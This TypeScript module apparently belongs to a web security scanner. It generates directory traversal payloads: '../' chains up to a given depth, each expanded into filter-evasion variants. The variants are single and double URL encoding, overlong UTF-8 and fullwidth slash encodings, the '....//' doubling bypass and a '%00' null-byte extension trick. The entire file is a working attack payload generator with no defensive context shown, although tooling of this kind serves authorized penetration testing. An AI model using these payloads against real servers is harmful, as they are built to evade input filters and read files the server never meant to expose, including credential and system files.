function generateAllLevelParams(str: string, maxLevel: number) {
  const list = [str]
  for (let i = 1; i <= maxLevel; i++) {
    let tmpStr = str.replace(/^\//, '')
    for (let j = 1; j <= i; j++) {
      tmpStr = '../' + tmpStr
    }
    list.push(tmpStr)
  }
  return list
}

function generateAllEncodeKeys(key: string) {
  const encodeKeys = myEncode(key)
  const doubleWrite = key.replace(/\.\.\//g, '....//')
  const encodeDoubleWriteKeys = myEncode(doubleWrite)
  return [key, ...encodeKeys, ...encodeDoubleWriteKeys]
}

function myEncode(str: string) {
  const list = []
  const encode = encodeURIComponent(str)
  const doubleEncode = encodeURIComponent(encode)
  const nonStandardEncode1 = str.replace(/\//g, '%c0%af')
  const nonStandardEncode2 = str.replace(/\//g, '%ef%bc%8f')
  const nonStandardEncodeJava = str.replace(/\//g, '%c0%ae')
  list.push(encode)
  list.push(doubleEncode)
  list.push(nonStandardEncode1)
  list.push(nonStandardEncode2)
  list.push(nonStandardEncodeJava)
  return list
}

export const generateDirectoryTraversalKeys = (
  findFile: string,
  maxLevel: number,
  extName?: string
) => {
  const allLevelKeys = generateAllLevelParams(findFile, maxLevel)
  const list: string[] = []
  allLevelKeys.forEach(key => {
    list.push(...generateAllEncodeKeys(key))
    if (extName) {
      list.push(...generateAllEncodeKeys(`${key}%00.${extName}`))
    }
  })
  return [...new Set(list)]
}
